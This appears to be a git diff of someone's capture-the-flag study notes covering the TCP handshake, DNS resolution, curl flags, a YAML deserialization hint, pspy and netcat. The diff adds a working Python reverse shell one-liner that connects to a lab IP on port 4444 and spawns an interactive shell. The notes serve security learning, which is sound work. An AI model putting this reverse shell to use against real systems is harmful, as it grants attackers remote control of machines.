@@ -289,14 +289,13 @@ It is a three-way-handshake = SYN - SYN/ACK - ACK
 
 <br />
 
-*
 DNS request goes like this: `computer` checks `local cache`, then if nothing found requests `recursive` --> `root name` points where is a domain and gives response back --> recursive points to `top level domain` to get `extension` which responds back --> 
 
 `recursive` request an `authorative` which has all parameters abotu domain 
 
 
 <br />
-*
+
 `-d` stands for `data` in curl POST request e.g `curl -X POST -d "flag_please"`
 
 `-c` stands for `cookie-jar` and is used in getting a cookie from website e.g `curl -c -  '$IP' `
@@ -305,10 +304,19 @@ DNS request goes like this: `computer` checks `local cache`, then if nothing fou
 
 
 <br />
-*
+
 If there is `.yml` file involved, it is good to check if  `yaml deserialization attack` in python is possible
 
+<br />
+
+`pspy` is a tool which shows processes, crons run by all users on machine
 
 <br />
-*
-`pspy` is a tool which shows processes, crons run by all users on machine
+
+`nc 10.10.211.152 110` to access `pop3` with netcat
+
+<br />
+
+`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.170.47",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
+
+Python revererse shell one liner
